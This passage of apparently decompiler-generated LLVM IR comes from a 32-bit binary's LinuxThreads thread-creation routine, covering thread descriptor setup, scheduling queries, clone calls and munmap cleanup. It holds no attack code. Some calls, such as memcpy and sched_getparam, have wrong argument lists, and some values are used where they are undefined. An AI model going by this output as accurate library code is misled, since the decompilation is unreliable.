  %v2_8056239 = add i32 %v0_805621c, 32
  %v3_8056239 = inttoptr i32 %v2_8056239 to i32*
  store i32 %v5_8056235, i32* %v3_8056239, align 4
  %v0_805623d = load i32, i32* %eax.global-to-local, align 4
  %v1_805623d = load i32, i32* @esi, align 4
  %v2_805623d = add i32 %v1_805623d, 16
  %v3_805623d = inttoptr i32 %v2_805623d to i32*
  store i32 %v0_805623d, i32* %v3_805623d, align 4
  %v0_8056240 = load i32, i32* @esp, align 4
  %v1_8056240 = add i32 %v0_8056240, 20
  %v2_8056240 = inttoptr i32 %v1_8056240 to i32*
  %v3_8056240 = load i32, i32* %v2_8056240, align 4
  %v0_8056244 = load i32, i32* @esi, align 4
  %v1_8056244 = add i32 %v0_8056244, 72
  %v2_8056247 = mul i32 %v3_8056240, 16
  store i32 %v2_8056247, i32* %edx.global-to-local, align 4
  %v2_805624a = add i32 %v0_8056244, 68
  %v3_805624a = inttoptr i32 %v2_805624a to i32*
  store i32 %v1_8056244, i32* %v3_805624a, align 4
  %v0_805624d = load i32, i32* @esi, align 4
  %v1_805624d = add i32 %v0_805624d, 80
  store i32 %v1_805624d, i32* %eax.global-to-local, align 4
  %v1_8056250 = add i32 %v0_805624d, 64
  %v2_8056250 = inttoptr i32 %v1_8056250 to i8*
  store i8 0, i8* %v2_8056250, align 1
  %v0_8056254 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056254 = add i32 %v0_8056254, 134674592
  store i32 %v1_8056254, i32* %ecx.global-to-local, align 4
  %v0_805625a = load i32, i32* @esi, align 4
  %v1_805625a = add i32 %v0_805625a, 65
  %v2_805625a = inttoptr i32 %v1_805625a to i8*
  store i8 0, i8* %v2_805625a, align 1
  %v0_805625e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805625e = load i32, i32* @esi, align 4
  %v2_805625e = add i32 %v1_805625e, 28
  %v3_805625e = inttoptr i32 %v2_805625e to i32*
  store i32 %v0_805625e, i32* %v3_805625e, align 4
  %v0_8056261 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056261 = load i32, i32* @esi, align 4
  %v2_8056261 = add i32 %v1_8056261, 76
  %v3_8056261 = inttoptr i32 %v2_8056261 to i32*
  store i32 %v0_8056261, i32* %v3_8056261, align 4
  %v0_8056264 = load i32, i32* @esp, align 4
  %v1_8056264 = add i32 %v0_8056264, 12
  %v2_8056264 = inttoptr i32 %v1_8056264 to i32*
  %v3_8056264 = load i32, i32* %v2_8056264, align 4
  store i32 %v3_8056264, i32* %eax.global-to-local, align 4
  %v0_8056268 = load i32, i32* @edi, align 4
  %v1_8056268 = icmp eq i32 %v0_8056268, 0
  %v1_805626a = load i32, i32* @esi, align 4
  %v2_805626a = add i32 %v1_805626a, 396
  %v3_805626a = inttoptr i32 %v2_805626a to i32*
  store i32 %v3_8056264, i32* %v3_805626a, align 4
  %v0_8056270 = load i32, i32* @esp, align 4
  %v1_8056270 = add i32 %v0_8056270, 8
  %v2_8056270 = inttoptr i32 %v1_8056270 to i32*
  %v3_8056270 = load i32, i32* %v2_8056270, align 4
  store i32 %v3_8056270, i32* %eax.global-to-local, align 4
  %v0_8056274 = load i32, i32* @esi, align 4
  %v1_8056274 = load i32, i32* @ebx, align 4
  %v2_8056274 = add i32 %v1_8056274, 404
  %v3_8056274 = inttoptr i32 %v2_8056274 to i32*
  store i32 %v0_8056274, i32* %v3_8056274, align 4
  %v0_805627a = load i32, i32* %eax.global-to-local, align 4
  %v1_805627a = load i32, i32* @esi, align 4
  %v2_805627a = add i32 %v1_805627a, 400
  %v3_805627a = inttoptr i32 %v2_805627a to i32*
  store i32 %v0_805627a, i32* %v3_805627a, align 4
  %v0_8056280 = load i32, i32* @esp, align 4
  %v1_8056280 = add i32 %v0_8056280, 20
  %v2_8056280 = inttoptr i32 %v1_8056280 to i32*
  %v3_8056280 = load i32, i32* %v2_8056280, align 4
  store i32 %v3_8056280, i32* %eax.global-to-local, align 4
  %v1_8056284 = load i32, i32* @esi, align 4
  %v2_8056284 = add i32 %v1_8056284, 408
  %v3_8056284 = inttoptr i32 %v2_8056284 to i32*
  store i32 %v3_8056280, i32* %v3_8056284, align 4
  %v0_805628a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805628a = add i32 %v0_805628a, 4
  %v2_805628a = inttoptr i32 %v1_805628a to i32*
  store i32 0, i32* %v2_805628a, align 4
  %v0_8056291 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056291 = add i32 %v0_8056291, 134674592
  %v2_8056291 = inttoptr i32 %v1_8056291 to i32*
  store i32 0, i32* %v2_8056291, align 4
  %v0_805629b = load i32, i32* @esi, align 4
  %v1_805629b = load i32, i32* %edx.global-to-local, align 4
  %v2_805629b = add i32 %v1_805629b, 134674600
  %v3_805629b = inttoptr i32 %v2_805629b to i32*
  store i32 %v0_805629b, i32* %v3_805629b, align 4
  %v0_80562a1 = load i32, i32* @ebp, align 4
  %v1_80562a1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80562a1 = add i32 %v1_80562a1, 134674604
  %v3_80562a1 = inttoptr i32 %v2_80562a1 to i32*
  store i32 %v0_80562a1, i32* %v3_80562a1, align 4
  %v0_80562a7 = load i32, i32* @esi, align 4
  %v1_80562a7 = add i32 %v0_80562a7, 228
  %v2_80562a7 = inttoptr i32 %v1_80562a7 to i32*
  store i32 -1, i32* %v2_80562a7, align 4
  br i1 %v1_8056268, label %dec_label_pc_8056319, label %dec_label_pc_80562b3

dec_label_pc_80562b3:                             ; preds = %dec_label_pc_8056208
  %v0_80562b3 = load i32, i32* @edi, align 4
  %v1_80562b3 = inttoptr i32 %v0_80562b3 to i32*
  %v2_80562b3 = load i32, i32* %v1_80562b3, align 4
  store i32 %v2_80562b3, i32* %eax.global-to-local, align 4
  %v1_80562b5 = trunc i32 %v2_80562b3 to i8
  %v2_80562b5 = load i32, i32* @esi, align 4
  %v3_80562b5 = add i32 %v2_80562b5, 45
  %v4_80562b5 = inttoptr i32 %v3_80562b5 to i8*
  store i8 %v1_80562b5, i8* %v4_80562b5, align 1
  %v0_80562b8 = load i32, i32* @edi, align 4
  %v1_80562b8 = add i32 %v0_80562b8, 24
  %v2_80562b8 = inttoptr i32 %v1_80562b8 to i32*
  %v3_80562b8 = load i32, i32* %v2_80562b8, align 4
  store i32 %v3_80562b8, i32* %eax.global-to-local, align 4
  %v1_80562bb = load i32, i32* @esi, align 4
  %v2_80562bb = add i32 %v1_80562bb, 392
  %v3_80562bb = inttoptr i32 %v2_80562bb to i32*
  store i32 %v3_80562b8, i32* %v3_80562bb, align 4
  %v0_80562c1 = load i32, i32* @edi, align 4
  %v1_80562c1 = add i32 %v0_80562c1, 12
  %v2_80562c1 = inttoptr i32 %v1_80562c1 to i32*
  %v3_80562c1 = load i32, i32* %v2_80562c1, align 4
  store i32 %v3_80562c1, i32* %eax.global-to-local, align 4
  %v1_80562c4 = icmp eq i32 %v3_80562c1, 0
  br i1 %v1_80562c4, label %dec_label_pc_80562e9, label %dec_label_pc_80562c8

dec_label_pc_80562c8:                             ; preds = %dec_label_pc_80562b3
  %v1_80562c8 = add i32 %v3_80562c1, -1
  %v8_80562c8 = icmp eq i32 %v1_80562c8, 0
  store i32 %v1_80562c8, i32* %eax.global-to-local, align 4
  %v1_80562c9 = icmp eq i1 %v8_80562c8, false
  br i1 %v1_80562c9, label %dec_label_pc_8056310, label %dec_label_pc_80562cb

dec_label_pc_80562cb:                             ; preds = %dec_label_pc_80562c8
  %v1_80562cb = add i32 %v0_80562c1, 4
  %v2_80562cb = inttoptr i32 %v1_80562cb to i32*
  %v3_80562cb = load i32, i32* %v2_80562cb, align 4
  %v1_80562ce = load i32, i32* @esi, align 4
  %v2_80562ce = add i32 %v1_80562ce, 228
  %v3_80562ce = inttoptr i32 %v2_80562ce to i32*
  store i32 %v3_80562cb, i32* %v3_80562ce, align 4
  %v0_80562d4 = load i32, i32* @edi, align 4
  %v1_80562d4 = add i32 %v0_80562d4, 8
  store i32 %v1_80562d4, i32* %eax.global-to-local, align 4
  %v0_80562d7 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80562d7 = load i32, i32* @esp, align 4
  %v2_80562d7 = add i32 %v1_80562d7, -4
  %v3_80562d7 = inttoptr i32 %v2_80562d7 to i32*
  store i32 %v0_80562d7, i32* %v3_80562d7, align 4
  %v1_80562d8 = add i32 %v1_80562d7, -8
  %v2_80562d8 = inttoptr i32 %v1_80562d8 to i32*
  store i32 4, i32* %v2_80562d8, align 4
  %v0_80562da = load i32, i32* %eax.global-to-local, align 4
  %v2_80562da = add i32 %v1_80562d7, -12
  %v3_80562da = inttoptr i32 %v2_80562da to i32*
  store i32 %v0_80562da, i32* %v3_80562da, align 4
  %v0_80562db = load i32, i32* @esi, align 4
  %v1_80562db = add i32 %v0_80562db, 232
  store i32 %v1_80562db, i32* %eax.global-to-local, align 4
  %v2_80562e1 = add i32 %v1_80562d7, -16
  %v3_80562e1 = inttoptr i32 %v2_80562e1 to i32*
  store i32 %v1_80562db, i32* %v3_80562e1, align 4
  %v2_80562e2 = load i32, i32* %stack_var_-16, align 4
  %v5_80562e2 = call i32 @memcpy(i16* %v4_8056336, i32 1, i32 %v2_80562e2)
  br label %dec_label_pc_805630d

dec_label_pc_80562e9:                             ; preds = %dec_label_pc_80562b3
  %v0_80562e9 = load i32, i32* @esp, align 4
  %v1_80562ec = add i32 %v0_80562e9, 28
  %v2_80562ec = inttoptr i32 %v1_80562ec to i32*
  %v3_80562ec = load i32, i32* %v2_80562ec, align 4
  %v5_80562ec = add i32 %v0_80562e9, -16
  %v6_80562ec = inttoptr i32 %v5_80562ec to i32*
  store i32 %v3_80562ec, i32* %v6_80562ec, align 4
  %v1_80562f0 = call i32 @sched_getscheduler(i32 %arg1)
  %v1_80562f5 = load i32, i32* @esi, align 4
  %v2_80562f5 = add i32 %v1_80562f5, 228
  %v3_80562f5 = inttoptr i32 %v2_80562f5 to i32*
  store i32 %v1_80562f0, i32* %v3_80562f5, align 4
  %v0_80562fb = load i32, i32* @esp, align 4
  %v1_80562fb = inttoptr i32 %v0_80562fb to i32*
  %v3_80562fb = add i32 %v0_80562fb, 4
  %v0_80562fc = load i32, i32* @esi, align 4
  %v1_80562fc = add i32 %v0_80562fc, 232
  store i32 %v1_80562fc, i32* %eax.global-to-local, align 4
  %v1_8056302 = inttoptr i32 %v3_80562fb to i32*
  %v2_8056302 = load i32, i32* %v1_8056302, align 4
  store i32 %v2_8056302, i32* %edx.global-to-local, align 4
  store i32 %v1_80562fc, i32* %v1_8056302, align 4
  %v1_8056304 = add i32 %v0_80562fb, 44
  %v2_8056304 = inttoptr i32 %v1_8056304 to i32*
  %v3_8056304 = load i32, i32* %v2_8056304, align 4
  store i32 %v3_8056304, i32* %v1_80562fb, align 4
  %v2_8056308 = load i32, i32* %stack_var_-16, align 4
  %v5_8056308 = call i32 @sched_getparam(i32 %arg1, i32 1, i32 %v2_8056308, i32 %v0_8055f5f)
  br label %dec_label_pc_805630d

dec_label_pc_805630d:                             ; preds = %dec_label_pc_80562cb, %dec_label_pc_80562e9
  %storemerge2 = phi i32 [ %v5_8056308, %dec_label_pc_80562e9 ], [ %v5_80562e2, %dec_label_pc_80562cb ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056310

dec_label_pc_8056310:                             ; preds = %dec_label_pc_80562c8, %dec_label_pc_805630d
  %v0_8056310 = load i32, i32* @ebx, align 4
  %v1_8056310 = add i32 %v0_8056310, 232
  %v2_8056310 = inttoptr i32 %v1_8056310 to i32*
  %v3_8056310 = load i32, i32* %v2_8056310, align 4
  store i32 %v3_8056310, i32* %eax.global-to-local, align 4
  %v2_8056316 = add i32 %v0_8056310, 24
  %v3_8056316 = inttoptr i32 %v2_8056316 to i32*
  store i32 %v3_8056310, i32* %v3_8056316, align 4
  br label %dec_label_pc_8056319

dec_label_pc_8056319:                             ; preds = %dec_label_pc_8056208, %dec_label_pc_8056310
  %v0_8056319 = load i32, i32* @esp, align 4
  %v1_8056319 = add i32 %v0_8056319, 36
  %v2_8056319 = inttoptr i32 %v1_8056319 to i32*
  %v3_8056319 = load i32, i32* %v2_8056319, align 4
  %v1_805631d = add i32 %v0_8056319, 68
  store i32 %v1_805631d, i32* %eax.global-to-local, align 4
  %v1_8056321 = load i32, i32* @ebx, align 4
  %v2_8056321 = add i32 %v1_8056321, 92
  %v3_8056321 = inttoptr i32 %v2_8056321 to i32*
  store i32 %v3_8056319, i32* %v3_8056321, align 4
  %v0_8056324 = load i32, i32* @ebx, align 4
  %v1_8056324 = add i32 %v0_8056324, 100
  store i32 %v1_8056324, i32* @edx, align 4
  %v0_8056327 = load i32, i32* @esp, align 4
  %v1_8056327 = add i32 %v0_8056327, 32
  %v2_8056327 = inttoptr i32 %v1_8056327 to i32*
  %v3_8056327 = load i32, i32* %v2_8056327, align 4
  store i32 %v3_8056327, i32* %ecx.global-to-local, align 4
  %v2_805632b = add i32 %v0_8056324, 96
  %v3_805632b = inttoptr i32 %v2_805632b to i32*
  store i32 %v3_8056327, i32* %v3_805632b, align 4
  %v0_805632e = load i32, i32* @ebp, align 4
  %v1_805632e = load i32, i32* @esp, align 4
  %v2_805632e = add i32 %v1_805632e, -4
  %v3_805632e = inttoptr i32 %v2_805632e to i32*
  store i32 %v0_805632e, i32* %v3_805632e, align 4
  %v1_805632f = add i32 %v1_805632e, -8
  %v2_805632f = inttoptr i32 %v1_805632f to i32*
  store i32 128, i32* %v2_805632f, align 4
  %v0_8056334 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056334 = add i32 %v1_805632e, -12
  %v3_8056334 = inttoptr i32 %v2_8056334 to i32*
  store i32 %v0_8056334, i32* %v3_8056334, align 4
  %v0_8056335 = load i32, i32* @edx, align 4
  %v2_8056335 = add i32 %v1_805632e, -16
  %v3_8056335 = inttoptr i32 %v2_8056335 to i32*
  store i32 %v0_8056335, i32* %v3_8056335, align 4
  %v2_8056336 = load i32, i32* %stack_var_-16, align 4
  %v5_8056336 = call i32 @memcpy(i16* %v4_8056336, i32 1, i32 %v2_8056336)
  store i32 %v5_8056336, i32* %eax.global-to-local, align 4
  %v0_805633b = load i32, i32* @esp, align 4
  %v1_805633b = inttoptr i32 %v0_805633b to i32*
  %v2_805633b = load i32, i32* %v1_805633b, align 4
  store i32 %v2_805633b, i32* @esi, align 4
  %v0_805633c = load i32, i32* @ebx, align 4
  %v1_805633c = add i32 %v0_805633c, 24
  %v2_805633c = inttoptr i32 %v1_805633c to i32*
  %v3_805633c = load i32, i32* %v2_805633c, align 4
  store i32 %v3_805633c, i32* %v1_805633b, align 4
  %v1_805633f = call i32 @__pthread_manager_adjust_prio(i32 %arg1)
  %v0_8056344 = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  %v1_8056349 = load i32, i32* @ebx, align 4
  %v2_8056349 = add i32 %v1_8056349, 4
  %v3_8056349 = inttoptr i32 %v2_8056349 to i32*
  store i32 %v0_8056344, i32* %v3_8056349, align 4
  %v0_805634f = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  %v1_8056356 = load i32, i32* @ebx, align 4
  %v2_8056356 = inttoptr i32 %v1_8056356 to i32*
  store i32 %v0_805634f, i32* %v2_8056356, align 4
  %v0_8056358 = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  %v0_805635f = load i32, i32* @ebx, align 4
  store i32 %v0_805635f, i32* @global_var_8073c84.658, align 4
  store i32 %v0_8056358, i32* %eax.global-to-local, align 4
  %v2_8056367 = inttoptr i32 %v0_8056358 to i32*
  store i32 %v0_805635f, i32* %v2_8056367, align 4
  %v0_8056369 = load i32, i32* @esp, align 4
  %v1_8056369 = add i32 %v0_8056369, 24
  %v2_8056369 = inttoptr i32 %v1_8056369 to i32*
  %v3_8056369 = load i32, i32* %v2_8056369, align 4
  %v4_8056369 = icmp eq i32 %v3_8056369, 0
  br i1 %v4_8056369, label %dec_label_pc_80563dc, label %dec_label_pc_8056370

dec_label_pc_8056370:                             ; preds = %dec_label_pc_8056319
  %v1_8056370 = add i32 %v0_8056369, 4
  %v2_8056370 = inttoptr i32 %v1_8056370 to i32*
  %v3_8056370 = load i32, i32* %v2_8056370, align 4
  store i32 %v3_8056370, i32* %ecx.global-to-local, align 4
  %v0_8056374 = load i32, i32* @global_var_807e104.655, align 4
  store i32 %v0_8056374, i32* %eax.global-to-local, align 4
  %v1_8056379 = add i32 %v3_8056370, 416
  %v2_8056379 = inttoptr i32 %v1_8056379 to i8*
  %v3_8056379 = load i8, i8* %v2_8056379, align 1
  %v4_8056379 = zext i8 %v3_8056379 to i32
  %v5_8056379 = load i32, i32* @edx, align 4
  %v6_8056379 = and i32 %v5_8056379, -256
  %v7_8056379 = or i32 %v4_8056379, %v0_8056374
  %v3_805637f = trunc i32 %v7_8056379 to i8
  %v5_805637f = icmp slt i8 %v3_805637f, 0
  %v9_805637f = urem i32 %v7_8056379, 256
  %v12_805637f = or i32 %v9_805637f, %v6_8056379
  store i32 %v12_805637f, i32* %edx.global-to-local, align 4
  %v1_8056381 = icmp eq i1 %v5_805637f, false
  br i1 %v1_8056381, label %dec_label_pc_80563dc, label %dec_label_pc_8056383

dec_label_pc_8056383:                             ; preds = %dec_label_pc_8056370
  store i32 0, i32* @edx, align 4
  %v0_8056385 = load i32, i32* @ebx, align 4
  %v1_8056385 = add i32 %v0_8056385, 28
  %v2_8056385 = inttoptr i32 %v1_8056385 to i32*
  %v3_8056385 = load i32, i32* %v2_8056385, align 4
  store i32 %v3_8056385, i32* @eax, align 4
  %v1_8056388 = call i32 @__pthread_lock(i32 %arg1)
  %v0_805638d = load i32, i32* @global_var_8073c8c.671, align 4
  %v12_8056392 = or i32 %v0_805638d, 3840
  store i32 %v12_8056392, i32* %eax.global-to-local, align 4
  %v0_8056395 = load i32, i32* @ebx, align 4
  %v1_8056395 = load i32, i32* @esp, align 4
  %v2_8056395 = add i32 %v1_8056395, -4
  %v3_8056395 = inttoptr i32 %v2_8056395 to i32*
  store i32 %v0_8056395, i32* %v3_8056395, align 4
  %v0_8056396 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056396 = add i32 %v1_8056395, -8
  %v3_8056396 = inttoptr i32 %v2_8056396 to i32*
  store i32 %v0_8056396, i32* %v3_8056396, align 4
  %v0_8056397 = load i32, i32* @ebx, align 4
  %v2_8056397 = add i32 %v1_8056395, -12
  %v3_8056397 = inttoptr i32 %v2_8056397 to i32*
  store i32 %v0_8056397, i32* %v3_8056397, align 4
  %v1_8056398 = add i32 %v1_8056395, -16
  %v2_8056398 = inttoptr i32 %v1_8056398 to i32*
  store i32 134569325, i32* %v2_8056398, align 4
  %v2_805639d = load i32, i32* %stack_var_-16, align 4
  %v5_805639d = call i32 @clone(i32 %arg1, i32 1, i32 %v2_805639d, i32 %v0_8055f5f)
  store i32 %v5_805639d, i32* @eax, align 4
  %v0_80563a2 = load i32, i32* @esp, align 4
  store i32 %v5_805639d, i32* @esi, align 4
  %v10_80563a7 = icmp eq i32 %v5_805639d, -1
  br i1 %v10_80563a7, label %dec_label_pc_80563d8, label %dec_label_pc_80563ac

dec_label_pc_80563ac:                             ; preds = %dec_label_pc_8056383
  %v0_80563ac = load i32, i32* @ebx, align 4
  %v2_80563ac = add i32 %v0_80563ac, 428
  %v3_80563ac = inttoptr i32 %v2_80563ac to i32*
  store i32 %v0_80563ac, i32* %v3_80563ac, align 4
  %v0_80563b2 = load i32, i32* @ebx, align 4
  %v1_80563b2 = add i32 %v0_80563b2, 424
  %v2_80563b2 = inttoptr i32 %v1_80563b2 to i32*
  store i32 8, i32* %v2_80563b2, align 4
  %v0_80563bc = load i32, i32* @ebx, align 4
  store i32 %v0_80563bc, i32* @global_var_807e10c.656, align 4
  %v2_80563c2 = add i32 %v0_80563bc, 20
  %v3_80563c2 = inttoptr i32 %v2_80563c2 to i32*
  store i32 %v5_805639d, i32* %v3_80563c2, align 4
  %v0_80563c5 = call i32 @__linuxthreads_create_event()
  store i32 %v0_80563c5, i32* %eax.global-to-local, align 4
  %v0_80563ca = load i32, i32* @esp, align 4
  %v0_80563cd = load i32, i32* @ebx, align 4
  %v1_80563cd = add i32 %v0_80563cd, 28
  %v2_80563cd = inttoptr i32 %v1_80563cd to i32*
  %v3_80563cd = load i32, i32* %v2_80563cd, align 4
  %v5_80563cd = add i32 %v0_80563ca, -16
  %v6_80563cd = inttoptr i32 %v5_80563cd to i32*
  store i32 %v3_80563cd, i32* %v6_80563cd, align 4
  %v2_80563d0 = call i32 @__pthread_unlock(i32* %v1_80564ef)
  store i32 %v2_80563d0, i32* %eax.global-to-local, align 4
  %v0_80563d5 = load i32, i32* @esp, align 4
  %v0_80563d8.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80563d8

dec_label_pc_80563d8:                             ; preds = %dec_label_pc_8056383, %dec_label_pc_80563ac
  %v1_80563e125.in = phi i32 [ %v0_80563a2, %dec_label_pc_8056383 ], [ %v0_80563d5, %dec_label_pc_80563ac ]
  %v0_80563d8 = phi i32 [ %v5_805639d, %dec_label_pc_8056383 ], [ %v0_80563d8.pre, %dec_label_pc_80563ac ]
  %v1_80563e125 = add i32 %v1_80563e125.in, 16
  %v1_80563d8 = icmp eq i32 %v0_80563d8, 0
  %v1_80563da = icmp eq i1 %v1_80563d8, false
  br i1 %v1_80563da, label %dec_label_pc_80563f6, label %dec_label_pc_80563dc

dec_label_pc_80563dc:                             ; preds = %dec_label_pc_80563d8, %dec_label_pc_8056370, %dec_label_pc_8056319
  %v1_80563e1 = phi i32 [ %v1_80563e125, %dec_label_pc_80563d8 ], [ %v0_8056369, %dec_label_pc_8056370 ], [ %v0_8056369, %dec_label_pc_8056319 ]
  %v0_80563dc = load i32, i32* @global_var_8073c8c.671, align 4
  store i32 %v0_80563dc, i32* %eax.global-to-local, align 4
  %v0_80563e1 = load i32, i32* @ebx, align 4
  %v2_80563e1 = add i32 %v1_80563e1, -4
  %v3_80563e1 = inttoptr i32 %v2_80563e1 to i32*
  store i32 %v0_80563e1, i32* %v3_80563e1, align 4
  %v0_80563e2 = load i32, i32* %eax.global-to-local, align 4
  %v12_80563e2 = or i32 %v0_80563e2, 3840
  store i32 %v12_80563e2, i32* %eax.global-to-local, align 4
  %v2_80563e5 = add i32 %v1_80563e1, -8
  %v3_80563e5 = inttoptr i32 %v2_80563e5 to i32*
  store i32 %v12_80563e2, i32* %v3_80563e5, align 4
  %v0_80563e6 = load i32, i32* @ebx, align 4
  %v2_80563e6 = add i32 %v1_80563e1, -12
  %v3_80563e6 = inttoptr i32 %v2_80563e6 to i32*
  store i32 %v0_80563e6, i32* %v3_80563e6, align 4
  %v1_80563e7 = add i32 %v1_80563e1, -16
  %v2_80563e7 = inttoptr i32 %v1_80563e7 to i32*
  store i32 134569118, i32* %v2_80563e7, align 4
  %v2_80563ec = load i32, i32* %stack_var_-16, align 4
  %v5_80563ec = call i32 @clone(i32 %arg1, i32 1, i32 %v2_80563ec, i32 %v0_8055f5f)
  store i32 %v5_80563ec, i32* %eax.global-to-local, align 4
  store i32 %v5_80563ec, i32* @esi, align 4
  br label %dec_label_pc_80563f6

dec_label_pc_80563f6:                             ; preds = %dec_label_pc_80563d8, %dec_label_pc_80563dc
  %v0_8056483 = phi i32 [ %v0_80563d8, %dec_label_pc_80563d8 ], [ %v5_80563ec, %dec_label_pc_80563dc ]
  %v10_80563f6 = icmp eq i32 %v0_8056483, -1
  %v1_80563f9 = icmp eq i1 %v10_80563f6, false
  %v1_8056483 = load i32, i32* @ebx, align 4
  br i1 %v1_80563f9, label %dec_label_pc_8056483, label %dec_label_pc_80563ff

dec_label_pc_80563ff:                             ; preds = %dec_label_pc_80563f6
  %v1_80563ff = inttoptr i32 %v1_8056483 to i32*
  %v2_80563ff = load i32, i32* %v1_80563ff, align 4
  store i32 %v2_80563ff, i32* %eax.global-to-local, align 4
  %v1_8056401 = add i32 %v1_8056483, 4
  %v2_8056401 = inttoptr i32 %v1_8056401 to i32*
  %v3_8056401 = load i32, i32* %v2_8056401, align 4
  store i32 %v3_8056401, i32* %edx.global-to-local, align 4
  %v0_8056404 = load i32, i32* @edi, align 4
  %v1_8056404 = icmp eq i32 %v0_8056404, 0
  %v2_8056406 = add i32 %v2_80563ff, 4
  %v3_8056406 = inttoptr i32 %v2_8056406 to i32*
  store i32 %v3_8056401, i32* %v3_8056406, align 4
  %v0_8056409 = load i32, i32* @ebx, align 4
  %v1_8056409 = add i32 %v0_8056409, 4
  %v2_8056409 = inttoptr i32 %v1_8056409 to i32*
  %v3_8056409 = load i32, i32* %v2_8056409, align 4
  store i32 %v3_8056409, i32* @edx, align 4
  %v0_805640c = load i32, i32* %eax.global-to-local, align 4
  %v2_805640c = inttoptr i32 %v3_8056409 to i32*
  store i32 %v0_805640c, i32* %v2_805640c, align 4
  br i1 %v1_8056404, label %dec_label_pc_8056416, label %dec_label_pc_8056410

dec_label_pc_8056410:                             ; preds = %dec_label_pc_80563ff
  %v0_8056410 = load i32, i32* @edi, align 4
  %v1_8056410 = add i32 %v0_8056410, 24
  %v2_8056410 = inttoptr i32 %v1_8056410 to i32*
  %v3_8056410 = load i32, i32* %v2_8056410, align 4
  %v4_8056410 = icmp eq i32 %v3_8056410, 0
  %v1_8056414 = icmp eq i1 %v4_8056410, false
  br i1 %v1_8056414, label %dec_label_pc_8056410.dec_label_pc_805644d_crit_edge, label %dec_label_pc_8056416

dec_label_pc_8056410.dec_label_pc_805644d_crit_edge: ; preds = %dec_label_pc_8056410
  %v0_805644d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805644d

dec_label_pc_8056416:                             ; preds = %dec_label_pc_8056410, %dec_label_pc_80563ff
  %v0_8056416 = load i32, i32* @ebx, align 4
  %v1_8056416 = add i32 %v0_8056416, 400
  %v2_8056416 = inttoptr i32 %v1_8056416 to i32*
  %v3_8056416 = load i32, i32* %v2_8056416, align 4
  store i32 %v3_8056416, i32* %eax.global-to-local, align 4
  %v1_805641c = icmp eq i32 %v3_8056416, 0
  br i1 %v1_805641c, label %dec_label_pc_8056416.dec_label_pc_8056431_crit_edge, label %dec_label_pc_8056420

dec_label_pc_8056416.dec_label_pc_8056431_crit_edge: ; preds = %dec_label_pc_8056416
  %v1_8056436.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056431

dec_label_pc_8056420:                             ; preds = %dec_label_pc_8056416
  %v0_8056420 = load i32, i32* @ecx, align 4
  %v1_8056420 = load i32, i32* @esp, align 4
  %v2_8056420 = add i32 %v1_8056420, -4
  %v3_8056420 = inttoptr i32 %v2_8056420 to i32*
  store i32 %v0_8056420, i32* %v3_8056420, align 4
  %v0_8056421 = load i32, i32* @ecx, align 4
  %v2_8056421 = add i32 %v1_8056420, -8
  %v3_8056421 = inttoptr i32 %v2_8056421 to i32*
  store i32 %v0_8056421, i32* %v3_8056421, align 4
  %v2_8056422 = add i32 %v1_8056420, -12
  %v3_8056422 = inttoptr i32 %v2_8056422 to i32*
  store i32 %v3_8056416, i32* %v3_8056422, align 4
  %v0_8056423 = load i32, i32* @ebx, align 4
  %v1_8056423 = add i32 %v0_8056423, 396
  %v2_8056423 = inttoptr i32 %v1_8056423 to i32*
  %v3_8056423 = load i32, i32* %v2_8056423, align 4
  %v5_8056423 = add i32 %v1_8056420, -16
  %v6_8056423 = inttoptr i32 %v5_8056423 to i32*
  store i32 %v3_8056423, i32* %v6_8056423, align 4
  %v2_8056429 = load i32, i32* %stack_var_-16, align 4
  %v5_8056429 = call i32 @munmap(i32 %arg1, i32 1, i32 %v2_8056429, i32 %v0_8055f5f)
  store i32 %v5_8056429, i32* %eax.global-to-local, align 4
  %v0_805642e = load i32, i32* @esp, align 4
  %v1_805642e = add i32 %v0_805642e, 16
  br label %dec_label_pc_8056431

dec_label_pc_8056431:                             ; preds = %dec_label_pc_8056416.dec_label_pc_8056431_crit_edge, %dec_label_pc_8056420
  %v1_8056436 = phi i32 [ %v1_8056436.pre, %dec_label_pc_8056416.dec_label_pc_8056431_crit_edge ], [ %v1_805642e, %dec_label_pc_8056420 ]
  %v0_8056431 = load i32, i32* @global_var_807c8d0.673, align 16
  store i32 %v0_8056431, i32* %eax.global-to-local, align 4
  %v0_8056436 = load i32, i32* @edx, align 4
  %v2_8056436 = add i32 %v1_8056436, -4
  %v3_8056436 = inttoptr i32 %v2_8056436 to i32*
  store i32 %v0_8056436, i32* %v3_8056436, align 4
  %v0_8056437 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056437 = mul i32 %v0_8056437, 4
  store i32 %v2_8056437, i32* %eax.global-to-local, align 4
  %v0_805643a = load i32, i32* @edx, align 4
  %v2_805643a = add i32 %v1_8056436, -8
  %v3_805643a = inttoptr i32 %v2_805643a to i32*
  store i32 %v0_805643a, i32* %v3_805643a, align 4
  %v0_805643b = load i32, i32* @ebx, align 4
  %v1_805643b = load i32, i32* %eax.global-to-local, align 4
  %v2_805643b = sub i32 %v0_805643b, %v1_805643b
  store i32 %v2_805643b, i32* @ebx, align 4
  %v2_805643d = add i32 %v1_8056436, -12
  %v3_805643d = inttoptr i32 %v2_805643d to i32*
  store i32 %v1_805643b, i32* %v3_805643d, align 4
  %v0_805643e = load i32, i32* @ebx, align 4
  %v1_805643e = add i32 %v0_805643e, 480
  store i32 %v1_805643e, i32* %eax.global-to-local, align 4
  %v2_8056444 = add i32 %v1_8056436, -16
  %v3_8056444 = inttoptr i32 %v2_8056444 to i32*
  store i32 %v1_805643e, i32* %v3_8056444, align 4
  %v2_8056445 = load i32, i32* %stack_var_-16, align 4
  %v5_8056445 = call i32 @munmap(i32 %arg1, i32 1, i32 %v2_8056445, i32 %v0_8055f5f)
